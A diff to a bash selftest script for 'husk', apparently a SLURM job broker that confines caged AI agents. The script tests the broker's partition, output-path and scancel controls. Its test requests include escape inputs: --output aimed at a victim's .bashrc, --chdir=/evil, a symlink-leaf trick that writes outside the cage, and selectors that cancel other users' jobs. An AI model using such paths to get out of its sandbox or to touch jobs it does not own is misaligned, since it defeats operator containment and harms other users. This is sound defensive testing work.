@@ -32,6 +32,10 @@
 #   ./selftest.sh --report report.txt   # also write the full evidence to a file
 #   ./selftest.sh --broker /path/to/husk-slurm-broker
 #
+# ONE BROKER. --broker (or $HUSK_BROKER, which is now a synonym for it) selects the binary
+# that is tested AND the binary that is asked for the operator's partition/account policy.
+# Those used to be resolved separately; see the note above BROKER_BIN's replacement.
+#
 # On a cluster, activate your uenv FIRST (the broker inherits it) — same as husk.
 set -uo pipefail   # NOT -e: run every check and tally, don't abort on first failure
 
@@ -48,7 +52,9 @@ while [ $# -gt 0 ]; do
     --broker) BROKER="${2:-}"; shift ;;
     --report) REPORT="${2:-}"; shift ;;
     -h|--help)
-      sed -n '2,40p' "$0" | sed 's/^# \{0,1\}//'
+      # 2,39 — the comment header, and NOT a line past it. This said 2,40 and printed
+      # `set -uo pipefail`, `HERE=...` and `REPO=...` as if they were usage (`B7-11`).
+      sed -n '2,39p' "$0" | sed 's/^# \{0,1\}//'
       exit 0 ;;
     *) echo "selftest: unknown argument '$1' (try --help)" >&2; exit 2 ;;
   esac
@@ -59,6 +65,13 @@ done
 if [ -n "$REPORT" ]; then exec > >(tee "$REPORT") 2>&1; fi
 
 # ---- locate the broker binary (same search order as the husk launcher) --------
+# ONE resolution, and $HUSK_BROKER feeds it. There used to be a second one further down
+# (`BROKER_BIN`, preferring ~/.local/bin) whose only job was to answer --print-config, so
+# the rig read its policy from the INSTALLED broker while testing whichever binary
+# --broker named. `TRIAGE-PROTOCOL` rule 6 tells every reviewer to pass --broker, which is
+# precisely the invocation that made the two diverge (`B7-2`). `P8`: one list, and this is
+# the one — everything downstream now asks $BROKER and nothing else.
+if [ -z "$BROKER" ]; then BROKER="${HUSK_BROKER:-}"; fi
 if [ -z "$BROKER" ]; then
   for c in "$HERE/husk-slurm-broker" \
            "$HERE/husk-slurm-broker-$(uname -m)" \
@@ -77,15 +90,41 @@ fi
 # workdir, so the credential auto-scan stays bounded), which would break a relative path.
 BROKER="$(cd "$(dirname "$BROKER")" && pwd)/$(basename "$BROKER")"
 
+# STALENESS GUARD. The search order above prefers a prebuilt binary next to this script
+# over a fresh `cargo build`, which is right on a cluster (that IS the deployed artifact)
+# and a trap on a development machine: a binary from last week silently produces a report
+# about last week's code. That already happened here — two policy checks "failed" against
+# a three-day-old build while the current one passed 20/20 — and it is the same class as
+# the stale seccomp-wrapper that cost two Balfrin bring-up rounds. Say so loudly; do not
+# refuse, because a deployed cluster legitimately has no sources beside the binary.
+if [ -d "$HERE/broker/src" ]; then
+  _stale_src=$(find "$HERE/broker/src" -name '*.rs' -newer "$BROKER" -print -quit 2>/dev/null || true)
+  if [ -n "$_stale_src" ]; then
+    echo "selftest: WARNING - the broker binary is OLDER than the sources"
+    echo "          binary : $BROKER"
+    echo "          newer  : $_stale_src"
+    echo "          You are testing a stale build. Rebuild, or pass --broker PATH."
+    echo
+  fi
+fi
+
 SPOOL="$(mktemp -d "${TMPDIR:-/tmp}/husk-selftest-spool.XXXXXX")"
+# The policy tier used a fictional /work as the request cwd, which was fine while every
+# decision was a pure function of the request. It is not any more: --chdir/--output/--error
+# are confined to the working directory, and confinement RESOLVES paths on disk (a lexical
+# check would let a symlink out of the tree past it, which is the whole point). So the
+# tier needs a real directory. It stays deterministic - nothing depends on the contents.
+PWORK="$(mktemp -d "${TMPDIR:-/tmp}/husk-selftest-pwork.XXXXXX")"
 BROKER_LOG="$SPOOL/broker.stderr.log"
 CANARY="husk-canary-$$-do-not-leak"
-CLEANUP=("$SPOOL")
+CLEANUP=("$SPOOL" "$PWORK")
 # Keep the evidence when something FAILED: the report points at the job's SLURM
 # output ("see .../slurm-<id>.out"), and that file lives in the work dir — deleting
 # it on the way out destroys the one artifact needed to diagnose the failure.
 cleanup() {
-  if [ "${FAIL:-0}" -gt 0 ]; then
+  # UNMEASURED too: an unmeasured run is the one you will re-run, and re-running is
+  # cheaper with the spool and the job output still on disk.
+  if [ "${FAIL:-0}" -gt 0 ] || [ "${UNMEASURED:-0}" -gt 0 ]; then
     printf '\nEvidence kept for diagnosis (delete when done):\n'
     for d in "${CLEANUP[@]}"; do [ -e "$d" ] && printf '  %s\n' "$d"; done
     return
@@ -97,6 +136,11 @@ trap cleanup EXIT
 # ---- result accumulation ------------------------------------------------------
 declare -a R_VERD=() R_TIER=() R_ID=() R_DET=() FP_LINES=()
 PASS=0; FAIL=0; SKIP=0; INFO=0
+# SKIP alone cannot gate the run: most SKIPs are legitimate absences (one partition
+# configured, no GPU) and failing on those would make the gate unusable. UNMEASURED is the
+# narrower thing - a claim this cluster was SUPPOSED to test and did not - and it is what
+# stops a run that measured nothing from exiting 0. Counted separately, never reset.
+UNMEASURED=0
 check() { # verdict tier id detail...
   local v="$1" t="$2" id="$3"; shift 3; local d="$*"
   R_VERD+=("$v"); R_TIER+=("$t"); R_ID+=("$id"); R_DET+=("$d")
@@ -148,12 +192,15 @@ PY
 
 # Run the broker once over the spool. $1 = "dry" or "live". stdout -> file arg $2.
 run_broker() { # mode outfile [broker-cwd]
-  # The broker resolves its compute-cage policy (settings + credential auto-scan) from
-  # its OWN cwd. Run it from a BOUNDED dir: the spool by default (small — keeps the
-  # policy tier's scan off a huge $PWD like a $SCRATCH root), and the WORK dir for the
-  # live probe, so the credential scan actually covers the planted secret — as it does
-  # in real use, where husk is launched from the bounded project dir (== the workdir).
-  local m="$1" out="$2" cdir="${3:-$SPOOL}" flag=""
+  # The broker resolves its compute-cage policy AND the cage's writable root from its OWN
+  # cwd — that cwd IS the trusted project dir, the directory a human launched husk in.
+  # So the policy tier runs it from $PWORK, the same directory the requests carry as their
+  # cwd: that is the real-use relationship, where husk is launched in the project and the
+  # agent submits from inside it. Running it from the spool instead made project dir and
+  # request cwd diverge, which is a configuration no real session produces.
+  # Both are small, so the credential auto-scan stays bounded either way; the live probe
+  # passes the WORK dir so the scan covers the planted secret.
+  local m="$1" out="$2" cdir="${3:-$PWORK}" flag=""
   [ "$m" = dry ] && flag="--dry-run"
   ( cd "$cdir" 2>/dev/null && "$BROKER" --once --spool "$SPOOL" $flag ) >"$out" 2>>"$BROKER_LOG"
 }
@@ -170,23 +217,140 @@ reset_spool() { rm -f "$SPOOL"/req-* "$SPOOL"/resp-* "$SPOOL"/job-* 2>/dev/null 
 # per-site partition would be silently ignored here and both sides would fall back to
 # `preemptible` — which does not exist on every cluster. Exported so the broker child
 # resolves the same value.
-PART="${HUSK_SLURM_PARTITION:-}"
-if [ -z "$PART" ]; then
-  for cfg in "$HOME/.local/lib/husk/slurm-partition" "$HERE/../lib/husk/slurm-partition"; do
-    if [ -r "$cfg" ]; then
-      PART="$(head -n1 "$cfg" | tr -d '[:space:]')"
-      [ -n "$PART" ] && break
-    fi
-  done
+# ORDER MIRRORS THE BROKER'S, and it has to.
+#
+# The broker reads ~/.husk/config.json FIRST and treats the env as a fallback. This block used
+# to read the env and the legacy install file only, and exported HUSK_SLURM_PARTITION so the
+# broker child would agree. The moment the config file became authoritative that export stopped
+# working: on Santis the selftest submitted `preemptible` while the broker allowed only `debug`,
+# and TWELVE arms failed on one cause (2026-08-18). A test rig that derives policy independently
+# of the thing it tests is a second reader of one policy — `P8` — and it drifted the first time
+# the source moved.
+# ASK THE BROKER. It is the only reader of the operator's config, and every attempt to work
+# this out independently has drifted: first the env-plus-legacy-file version, which submitted
+# `preemptible` while the broker allowed `debug` and failed twelve arms on one refusal; then a
+# shell re-implementation that needed python3, which is not on PATH everywhere, and failed the
+# same way on the same cluster the same day. `P8` says make one list assert the other — cheaper
+# here to have one list and ask it.
+#
+# AND ASK **THE** BROKER — the one under test. The version of this block that ended the Santis
+# incident asked a second, independently-resolved binary, so the fix reproduced the bug it was
+# written to end. That is husk's recurring shape: the comment names the class and the fix lands
+# one level off.
+# ASK THE BINARY UNDER TEST, and RECORD THE ANSWER AS AN ARM. The previous version asked a
+# DIFFERENT binary and swallowed the answer's failure with `2>/dev/null || true`, so a broker
+# that did not understand `--print-config` was indistinguishable from one that answered
+# "nothing configured": PART fell back to `preemptible`, and every subsequent arm tested the
+# wrong policy. Measured on a laptop 2026-08-31 — 9 arms red, 5 more vacuously green, no
+# warning (`B7-2`). The transcript ALREADY carried the tell on line 1 (`partition=... of
+# [...]`) and four bring-up rounds walked past it (`F1 §3.1`); a line nobody reads is not a
+# control (`P7`), so it is an arm now and it can be graded from a report.
+PART=""
+ACCT_CFG=""
+CFG_ERRF="$SPOOL/print-config.err"
+CFG_OUT="$("$BROKER" --print-config 2>"$CFG_ERRF")" || true
+# The note is on STDERR, not stdout: --print-config writes partitions=/accounts=/uenvs= with
+# println! (main.rs:905) and the "broker: operator config ..." line with eprintln!. Reading it
+# out of $CFG_OUT could never match, so this arm printed "<no config line>" on every run since
+# it was added — an arm whose whole job is to say WHICH broker answered, with its evidence field
+# structurally empty. Measured on Balfrin 2026-09-01. `P11`.
+CFG_NOTE="$(sed -n '/^broker: operator config /{p;q;}' "$CFG_ERRF" 2>/dev/null)"
+PART="$(printf '%s\n' "$CFG_OUT" | sed -n 's/^partitions=//p')"
+ACCT_CFG="$(printf '%s\n' "$CFG_OUT" | sed -n 's/^accounts=//p' | cut -d, -f1)"
+if [ -n "$PART" ]; then
+  check PASS policy rig.config_source \
+    "policy read from the broker UNDER TEST — ${CFG_NOTE:-<no config line>}"
+else
+  # FAIL, and then CARRY ON. A hard exit here is the tempting fix and it is the wrong one:
+  # it turns an instrument fault into a refusal to test anything, which is the operator-facing
+  # denial this round has already produced three times. Instead the run continues with an
+  # attributed first failure, and `expect_rejection_because` below makes every downstream arm
+  # say WHICH refusal it saw — so the nine that go red name the partition message rather than
+  # looking like nine independent regressions (`P11`).
+  check FAIL policy rig.config_source \
+    "the broker under test could not answer --print-config, so this rig does not know the site policy it is about to assert. Falling back to HUSK_SLURM_PARTITION / the install-time file / 'preemptible' — every partition-dependent arm below is now testing a GUESS. broker=$BROKER stderr=$(head -c 120 "$CFG_ERRF" 2>/dev/null | tr '\n' ' ')"
+  PART="${HUSK_SLURM_PARTITION:-}"
+  if [ -z "$PART" ]; then
+    for cfg in "$HOME/.local/lib/husk/slurm-partition" "$HERE/../lib/husk/slurm-partition"; do
+      if [ -r "$cfg" ]; then
+        PART="$(head -n1 "$cfg" | tr -d '[:space:]')"
+        [ -n "$PART" ] && break
+      fi
+    done
+  fi
 fi
 PART="${PART:-preemptible}"
 export HUSK_SLURM_PARTITION="$PART"
-echo "== policy tier (broker --dry-run; deterministic, no submission; partition=$PART) =="
+# HUSK_SLURM_PARTITION may be a comma-separated LIST (Balfrin: GPU `short` plus CPU-only
+# `pp-short`). Every arm below submits ONE job, so it uses the FIRST entry; the broker
+# accepts any of them and refuses the rest.
+PART_LIST="$PART"
+PART="${PART%%,*}"
+PART="$(printf '%s' "$PART" | tr -d '[:space:]')"
+# The project account, resolved exactly as the launcher does. Sites whose cli_filter
+# requires one (Santis) reject EVERY live submission without it, which is what turned the
+# first Santis run into three identical containment failures.
+# From the same one answer the broker gave above.
+ACCT="$ACCT_CFG"
+[ -z "$ACCT" ] && ACCT="${HUSK_SLURM_ACCOUNT:-}"
+if [ -z "$ACCT" ]; then
+  for cfg in "$HOME/.local/lib/husk/slurm-account" "$HERE/../lib/husk/slurm-account"; do
+    if [ -r "$cfg" ]; then
+      ACCT="$(head -n1 "$cfg" | tr -d '[:space:]')"
+      [ -n "$ACCT" ] && break
+    fi
+  done
+fi
+[ -n "$ACCT" ] && export HUSK_SLURM_ACCOUNT="$ACCT"
+echo "== policy tier (broker --dry-run; deterministic, no submission; partition=$PART of [$PART_LIST]) =="
 
 expect_status() { # id expected humanid detail
   local got; got="$(respfield "$1" status)"
   if [ "$got" = "$2" ]; then check PASS policy "$3" "status=$got — $4"
   else check FAIL policy "$3" "got status='$got' expected='$2' — $4"; fi
+}
+
+# expect_rejection_because ID REGEX HUMANID DETAIL
+#
+# WHY THIS EXISTS, and why `expect_status <id> rejected` is not enough.
+#
+# Replace `policy.rs::decide` with `return Reject("nope")` — deleting every submission
+# control husk has, the partition gate, the --output confinement, the symlink-leaf refusal,
+# the allowlist, the directive vetting — and 20 of this file's 32 executed policy arms still
+# PASS, because they assert the DISPOSITION and nothing about the reason (`B7-1`, `C2-5`,
+# count reproduced independently twice). `D1` sharpened the reading and it is the honest one:
+# the arms DO catch the fail-open direction (disable A1's leaf check and
+# `sbatch.output_symlink_leaf` goes red), so this is a DIAGNOSTIC hole, not a containment
+# one. But the diagnosis is what the release gate is FOR. `B7-2` put the suite into exactly
+# this state in a real run, and the report contained the line
+#
+#     PASS policy sbatch.output_symlink_leaf  a symlink leaf in --output is refused (A1):
+#         husk submits brokered jobs only to these partitions: debug;
+#
+# — A1's regression test, green, quoting a refusal about the partition. Five arms were
+# simultaneously vacuous and the summary said `0 FAIL`.
+#
+# So: assert the CONTROL, by requiring the refusal to name the thing under test. The
+# technique was already in this file, applied to 2 of 20 sites (`:420` greps for 'output';
+# `:585` states the principle outright as the rationale for one accept-side twin). `C4`
+# exactly — the comment named the class and the fix landed on one instance. This is the
+# sweep.
+#
+# The regexes are deliberately SHORT and anchored on the option or the noun the control
+# owns, never on a whole sentence: `P12` says the prose drifts toward intent, and an arm
+# that pins a sentence is an arm that goes red on a wording fix. What must not drift is
+# that a refusal about `--prolog` mentions `--prolog`.
+expect_rejection_because() { # id regex humanid detail
+  local st msg; st="$(respfield "$1" status)"; msg="$(respfield "$1" message)"
+  if [ "$st" != rejected ]; then
+    check FAIL policy "$3" "got status='$st' expected='rejected' — $4"
+  elif [ -z "$msg" ]; then
+    check FAIL policy "$3" "refused with an EMPTY message, so nothing says which control fired — $4"
+  elif printf '%s' "$msg" | grep -qiE -- "$2"; then
+    check PASS policy "$3" "refused, and the refusal names the control (/$2/) — $4"
+  else
+    check FAIL policy "$3" "refused, but NOT by the control under test: no /$2/ in \"${msg:0:110}\" — $4"
+  fi
 }
 
 VALID_BODY='#!/bin/bash
@@ -196,25 +360,138 @@ echo hi
 
 # P1 — a valid submission (partition == the site's required one) is accepted.
 reset_spool
-mkreq p1 sbatch "[\"--partition=$PART\"]" /work "$VALID_BODY"
+mkreq p1 sbatch "[\"--partition=$PART\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p1"
 expect_status p1 submitted sbatch.valid "valid --partition=$PART submission accepted"
 
 # P2 — no partition is rejected AND the message names the required partition.
 reset_spool
-mkreq p2 sbatch '["--nodes=1"]' /work "$VALID_BODY"
+mkreq p2 sbatch '["--nodes=1"]' "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p2"
-if [ "$(respfield p2 status)" = rejected ] && respfield p2 message | grep -qi -- "$PART"; then
-  check PASS policy sbatch.no_partition "rejected + teaches --partition=$PART"
+# The grep used to be for a BARE "$PART", and that is a false friend whenever the site
+# partition is `preemptible`: the refusal's standing advice ends "...are typically
+# preemptible/low-priority, so checkpoint your work", so the arm passed on the boilerplate
+# rather than on the list. Found by running this suite against a broker whose refusal named
+# a DIFFERENT partition — it still went green. Anchor on the enumeration itself, and stop at
+# the `;` so the advice text cannot supply the match. NB the resubmit hint is
+# `--partition=<one of: a, b>` when several are configured (Balfrin), so it is the list that
+# must be asserted, not the hint.
+if [ "$(respfield p2 status)" = rejected ] \
+   && respfield p2 message | grep -qiE "only to these partitions:[^;]*$PART"; then
+  check PASS policy sbatch.no_partition "rejected + the refusal lists $PART as an allowed partition"
 else
   check FAIL policy sbatch.no_partition "status=$(respfield p2 status) msg=$(respfield p2 message)"
 fi
 
+# P2b — the refusal must not read as a claim about the CLUSTER.
+# A caged agent hit this guard on 2026-08-01, checked sinfo, saw `normal` up with 28 idle
+# nodes, and read "only --partition=short is permitted here" as a possibly SPOOFED message
+# — spending calls corroborating before it would act on it. Availability is not
+# authorization; the message has to name husk as the restricting party and concede that
+# other partitions exist.
+P2B_MSG="$(respfield p2 message)"
+if printf '%s' "$P2B_MSG" | grep -q "husk" \
+   && printf '%s' "$P2B_MSG" | grep -qi "idle\|availability" \
+   && ! printf '%s' "$P2B_MSG" | grep -q "is permitted here"; then
+  check PASS policy sbatch.refusal_attributed "the refusal names husk and does not claim other partitions are down"
+else
+  check FAIL policy sbatch.refusal_attributed "refusal reads as a claim about the cluster: ${P2B_MSG:0:120}"
+fi
+
+# P2c — the refusal is byte-identical on retry. That agent's report was explicit that the
+# repeat is what let it conclude "standing policy" rather than "transient failure"; an
+# intermittent-looking gate "would likely have gotten a blind retry instead".
+reset_spool
+mkreq p2r sbatch '["--nodes=1"]' "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p2r"
+# ANCHORED, because as written this arm compared two responses TO EACH OTHER and nothing
+# else: any deterministic broker passed it, including one that refuses everything with
+# "nope" and one that refuses nothing and returns an empty message (`C2-5` measured both).
+# It is the only policy arm that was invisible to BOTH mutation directions. Its stated
+# contract needs there to BE a refusal and for it to be THE PARTITION refusal, so assert
+# that first and only then that it repeats.
+if [ "$(respfield p2r status)" != rejected ]; then
+  check FAIL policy sbatch.refusal_stable "the retry was not refused at all (status=$(respfield p2r status)) - there is no standing refusal to be stable"
+elif [ -z "$P2B_MSG" ] || ! printf '%s' "$P2B_MSG" | grep -qiE 'only to these partitions'; then
+  check FAIL policy sbatch.refusal_stable "the first refusal was not the partition refusal, so 'identical on retry' would pin the wrong message: \"${P2B_MSG:0:90}\""
+elif [ "$(respfield p2r message)" = "$P2B_MSG" ]; then
+  check PASS policy sbatch.refusal_stable "the partition refusal is byte-identical on retry (reads as standing policy)"
+else
+  check FAIL policy sbatch.refusal_stable "the refusal changed between identical requests"
+fi
+
+# P2d — the ACCEPTED path warns about the wall limit it just inherited. husk forces every
+# job onto one partition, so it moves jobs somewhere with limits their author never chose.
+# The same agent's job silently took 30 minutes and it only learned that from squeue
+# afterwards: harmless at 7 minutes, fatal for a longer run. Needs a real scontrol, so it
+# skips where there is no SLURM.
+reset_spool
+mkreq p2t sbatch "[\"--partition=$PART\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p2t"
+P2T_MSG="$(respfield p2t message)"
+if ! scontrol show partition "$PART" >/dev/null 2>&1; then
+  check SKIP policy sbatch.time_warned "no scontrol here — husk cannot read the partition's limits"
+elif printf '%s' "$P2T_MSG" | grep -q -- "--time"; then
+  check PASS policy sbatch.time_warned "an untimed submission is told the limit it inherits: ${P2T_MSG:0:60}"
+else
+  check FAIL policy sbatch.time_warned "accepted with no word about the inherited wall limit (msg='${P2T_MSG:0:80}')"
+fi
+
+# P2e — and a submission that CHOSE a limit is not lectured about it.
+reset_spool
+mkreq p2u sbatch "[\"--partition=$PART\",\"--time=02:00:00\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p2u"
+if [ -z "$(respfield p2u message)" ]; then
+  check PASS policy sbatch.time_quiet "a submission that sets --time is not lectured about limits"
+else
+  check FAIL policy sbatch.time_quiet "warned a submission that chose its own --time: $(respfield p2u message)"
+fi
+
+# P2f — scancel is brokered, but ONLY as job ids this session submitted. The selectors are
+# the danger: `scancel -u $USER` would kill every job this human owns, including production
+# runs husk never submitted. A fresh broker has submitted nothing, so even a well-formed id
+# must be refused — that is the ownership gate, not a parse failure.
+# The expected REASON is data beside each case, and the four are not the same reason: three
+# are refused because the argument is a SELECTOR, the fourth because the id is not one this
+# session submitted. An arm that only asserted `rejected` passed all four against a broker
+# with no policy at all (`B7-1`); worse, it would pass with the ownership gate deleted and
+# the parse gate left, which is the swap that matters.
+# Delimiter is `|`: a scancel argv contains `:` (`4991406.0`) and a regex may too.
+for sc_case in 'sc_sel|["-u","someone"]|option .-u. is not permitted' \
+               'sc_me|["--me"]|option .--me. is not permitted' \
+               'sc_state|["--state=PENDING"]|option .--state=PENDING. is not permitted' \
+               'sc_own|["4991406"]|did not submit it|not cancel 4991406'; do
+  sc_id="${sc_case%%|*}"; sc_rest="${sc_case#*|}"
+  sc_argv="${sc_rest%%|*}"; sc_why="${sc_rest#*|}"
+  reset_spool
+  mkreq "$sc_id" scancel "$sc_argv" "$PWORK" "$VALID_BODY"
+  run_broker dry "$SPOOL/out.$sc_id"
+  expect_rejection_because "$sc_id" "$sc_why" "scancel.$sc_id" \
+    "scancel $sc_argv must be refused - an agent could otherwise cancel jobs husk never submitted"
+done
+
+# P2g — every partition in the operator's list is accepted, not just the first. Clusters
+# are not homogeneous (Balfrin: GPU `short`, CPU-only `pp-short`), and a workflow needs both.
+# Skips where only one is configured, since there is nothing to distinguish.
+case "$PART_LIST" in
+  *,*)
+    PART_SECOND="$(printf '%s' "${PART_LIST#*,}" | cut -d, -f1 | tr -d '[:space:]')"
+    reset_spool
+    mkreq p2g sbatch "[\"--partition=$PART_SECOND\"]" "$PWORK" "$VALID_BODY"
+    run_broker dry "$SPOOL/out.p2g"
+    if [ "$(respfield p2g status)" = submitted ]; then
+      check PASS policy sbatch.partition_list "a job may also request '$PART_SECOND', the second allowed partition"
+    else
+      check FAIL policy sbatch.partition_list "'$PART_SECOND' is in HUSK_SLURM_PARTITION but was refused: $(respfield p2g message | head -c 70)"
+    fi ;;
+  *) check SKIP policy sbatch.partition_list "only one partition configured - set --slurm-partition a,b to exercise the list" ;;
+esac
+
 # P3 — a wrong partition is rejected.
 reset_spool
-mkreq p3 sbatch "[\"--partition=${PART}-nope\"]" /work "$VALID_BODY"
+mkreq p3 sbatch "[\"--partition=${PART}-nope\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p3"
-expect_status p3 rejected sbatch.wrong_partition "partition != $PART rejected"
+expect_rejection_because p3 'only to these partitions' sbatch.wrong_partition "partition != $PART rejected"
 
 # P4 — partition supplied via a #SBATCH directive (not CLI) is accepted.
 reset_spool
@@ -222,7 +499,7 @@ DIRECTIVE_BODY="#!/bin/bash
 #SBATCH --partition=$PART
 echo hi
 "
-mkreq p4 sbatch '[]' /work "$DIRECTIVE_BODY"
+mkreq p4 sbatch '[]' "$PWORK" "$DIRECTIVE_BODY"
 run_broker dry "$SPOOL/out.p4"
 expect_status p4 submitted sbatch.directive_partition "#SBATCH partition directive honoured"
 
@@ -232,40 +509,115 @@ expect_status p4 submitted sbatch.directive_partition "#SBATCH partition directi
 # (We use a sentinel export var, NOT ALL: the broker itself legitimately forces
 # --export=ALL for uenv jobs, so ALL can't distinguish a leak from the broker's own.)
 reset_spool
-mkreq p5 sbatch "[\"--partition=$PART\",\"-o\",\"/users/victim/.bashrc\",\"--chdir=/evil\",\"--export=SNEAKYVAR\",\"--nodes=2\"]" /work "$VALID_BODY"
+mkreq p5 sbatch "[\"--partition=$PART\",\"--export=SNEAKYVAR\",\"--time=01:00:00\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p5"
 ARGV_LINE="$(grep -m1 '^argv:' "$SPOOL/out.p5" || true)"
 p5_ok=1; p5_why=""
-grep -q '/users/victim/.bashrc' <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked -o path; "; }
-grep -q '/evil'                 <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked --chdir; "; }
 grep -q 'SNEAKYVAR'             <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked agent --export; "; }
-grep -q 'output=/work/slurm-%j.out' <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --output; "; }
-grep -q 'chdir=/work'           <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --chdir; "; }
-grep -q 'nodes=2'               <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="dropped benign --nodes; "; }
-if [ "$p5_ok" = 1 ]; then check PASS policy sbatch.force_safe "dangerous -o/--chdir/agent --export forced safe; benign --nodes kept"
+grep -q 'export=ALL'            <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --export=ALL; "; }
+grep -q "output=$PWORK/slurm-%j.out" <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no default --output; "; }
+grep -q "chdir=$PWORK"          <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no default --chdir; "; }
+grep -q 'time=01:00:00'         <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="dropped benign --time; "; }
+if [ "$p5_ok" = 1 ]; then check PASS policy sbatch.force_safe "agent --export forced to ALL; default output/chdir applied; benign --time kept"
 else check FAIL policy sbatch.force_safe "${p5_why%; }"; fi
+
+# --output/--chdir pointing OUT of the working directory must be REFUSED, not quietly
+# replaced. slurmd writes those files as you and OUTSIDE the cage, so an unconfined path
+# is an uncaged arbitrary write (job stdout into ~/.bashrc is AV2 with the cage bypassed).
+# Both the glued short spelling and an absolute path are checked, because F13 was exactly
+# a spelling that slipped past.
+mkreq p5b sbatch "[\"--partition=$PART\",\"-o/users/victim/.bashrc\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p5b"
+p5b_st="$(respfield p5b status)"; p5b_msg="$(respfield p5b message)"
+if [ "$p5b_st" = rejected ] && grep -qiE -- '--output' <<<"$p5b_msg" \
+   && grep -qiE 'may write|confines' <<<"$p5b_msg"; then
+  check PASS policy sbatch.output_confined "glued -o outside the workdir rejected: ${p5b_msg:0:70}"
+else
+  check FAIL policy sbatch.output_confined "status=$p5b_st msg=$p5b_msg (an uncaged write path was not refused)"
+fi
+
+# P5b2 — A1, the escape a live reviewer walked out with (Balfrin, 2026-08-04). The parent
+# of --output is confined on disk, but the LEAF cannot be canonicalised (it may be `%j`), so
+# it used to be appended as text — and a leaf that is already a SYMLINK is followed by
+# slurmd's open(), as you, outside the cage. The symlink lives INSIDE the writable workdir,
+# so every check on the parent passes; the file lands wherever it points.
+#
+# On disk on purpose: this is the one arm that cannot be checked from a request alone, and
+# it must run where /scratch really is (a canonicalisation on Lustre is not a unit test).
+A1LINK="$PWORK/husk-selftest-a1-link.out"
+A1TGT="$(dirname "$PWORK")/husk-selftest-a1-WITNESS.out"
+ln -sfn "$A1TGT" "$A1LINK" 2>/dev/null || true
+mkreq p5b2 sbatch "[\"--partition=$PART\",\"--output=$A1LINK\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p5b2"
+p5b2_st="$(respfield p5b2 status)"; p5b2_msg="$(respfield p5b2 message)"
+# The refusal must be ABOUT THIS PATH. `rejected` alone was satisfied by any refusal, and
+# `B7-2` produced a live run where this arm printed PASS while quoting a refusal about the
+# partition — A1's regression test, green, having measured nothing. The link lives inside
+# the workdir, so naming it is what distinguishes "the leaf check fired" from "something
+# else said no first".
+if [ "$p5b2_st" != rejected ]; then
+  check FAIL policy sbatch.output_symlink_leaf "status=$p5b2_st - the A1 arbitrary-write escape is OPEN"
+elif printf '%s' "$p5b2_msg" | grep -qiE -- '--output' \
+     && printf '%s' "$p5b2_msg" | grep -qF -- "$A1LINK"; then
+  check PASS policy sbatch.output_symlink_leaf "a symlink leaf in --output is refused BY NAME (A1): ${p5b2_msg:0:60}"
+else
+  check FAIL policy sbatch.output_symlink_leaf "refused, but not by the --output leaf check - the message names neither --output nor $A1LINK: \"${p5b2_msg:0:90}\""
+fi
+# The refusal must teach without answering questions about the host filesystem: no resolved
+# target, no errno, no present-vs-absent tell (A7-1 — husk's message was an existence oracle
+# for paths the cage hides). Anchored on p5b, whose rejection is unconditional: asserting
+# "no leak" on a message that is EMPTY because the request was accepted is a vacuous pass,
+# and this arm exists precisely for the case where the other one has failed.
+# ...and it must be opacity OF THE CONFINEMENT REFUSAL. `rejected` plus a non-empty message
+# was satisfied by a broker that refuses everything with the word "nope", which leaks no host
+# fact and measures nothing (`B7-1`). SKIP rather than FAIL when the wrong message arrived:
+# `output_confined` above is already red for that one cause, and a second red for the same
+# cause is the unattributed pile-up `B7-2` produced (`P11`).
+if [ -z "$p5b_msg" ]; then
+  check FAIL policy sbatch.confine_msg_opaque "no refusal message to inspect (see output_confined)"
+elif ! grep -qiE -- '--output' <<<"$p5b_msg"; then
+  check SKIP policy sbatch.confine_msg_opaque "the refusal on hand is not the --output confinement refusal, so its opacity says nothing about A7-1 (see output_confined)"
+elif grep -qE 'resolves to|os error|No such file' <<<"$p5b_msg"; then
+  check FAIL policy sbatch.confine_msg_opaque "the refusal leaks host filesystem state: $p5b_msg"
+else
+  check PASS policy sbatch.confine_msg_opaque "the refusal names no host fact (A7-1)"
+fi
+rm -f "$A1LINK" 2>/dev/null || true
+[ -e "$A1TGT" ] && check FAIL containment sbatch.output_symlink_leaf "A WITNESS FILE WAS CREATED AT $A1TGT - the escape ran"
+
+mkreq p5c sbatch "[\"--partition=$PART\",\"--chdir=/evil\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p5c"
+expect_rejection_because p5c '--chdir' sbatch.chdir_confined "--chdir=/evil must be refused by the chdir confinement, not by something upstream"
 
 # P6 — a read-only query is routed to Query (status=ok), not rejected.
 reset_spool
-mkreq p6 squeue '["--me"]' /work ""
+mkreq p6 squeue '["--me"]' "$PWORK" ""
 run_broker dry "$SPOOL/out.p6"
 expect_status p6 ok squeue.routed "read-only squeue routed to a query"
 
-# P7/P8/P9 — state-changing / interactive commands are rejected.
+# P7/P8 — interactive commands stay unbrokered. scancel LEFT this list when it became
+# brokered (P2f above covers it): it is now refused on ownership and on selectors, not on
+# its name, and an arm asserting "scancel is not brokered" would be pinning a claim that
+# stopped being true.
 i=7
-for tool in scancel srun salloc; do
+for tool in srun salloc; do
   reset_spool
-  mkreq "p$i" "$tool" '["x"]' /work ""
+  mkreq "p$i" "$tool" '["x"]' "$PWORK" ""
   run_broker dry "$SPOOL/out.p$i"
-  expect_status "p$i" rejected "$tool.rejected" "$tool is not brokered"
+  expect_rejection_because "p$i" "$tool.*not brokered|not brokered" "$tool.rejected" "$tool is not brokered"
   i=$((i+1))
 done
